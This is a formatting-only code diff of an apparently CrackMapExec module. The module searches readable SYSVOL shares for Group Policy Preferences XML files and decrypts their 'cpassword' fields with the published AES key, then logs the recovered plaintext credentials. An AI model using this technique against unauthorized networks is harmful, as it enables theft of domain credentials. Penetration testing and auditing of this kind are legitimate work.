@@ -28,9 +28,7 @@ class CMEModule:
         for share in shares:
             if share["name"] == "SYSVOL" and "READ" in share["access"]:
                 context.log.success("Found SYSVOL share")
-                context.log.display(
-                    "Searching for potential XML files containing passwords"
-                )
+                context.log.display("Searching for potential XML files containing passwords")
 
                 paths = connection.spider(
                     "SYSVOL",
@@ -90,9 +88,7 @@ class CMEModule:
 
                                 password = self.decrypt_cpassword(props["cpassword"])
 
-                                context.log.success(
-                                    "Found credentials in {}".format(path)
-                                )
+                                context.log.success("Found credentials in {}".format(path))
                                 context.log.highlight("Password: {}".format(password))
                                 for k, v in props.items():
                                     if k != "cpassword":
@@ -111,9 +107,7 @@ class CMEModule:
         # Stolen from hhttps://gist.github.com/andreafortuna/4d32100ae03abead52e8f3f61ab70385
 
         # From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
-        key = unhexlify(
-            "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"
-        )
+        key = unhexlify("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")
         cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
         password = b64decode(cpassword)
         IV = "\x00" * 16
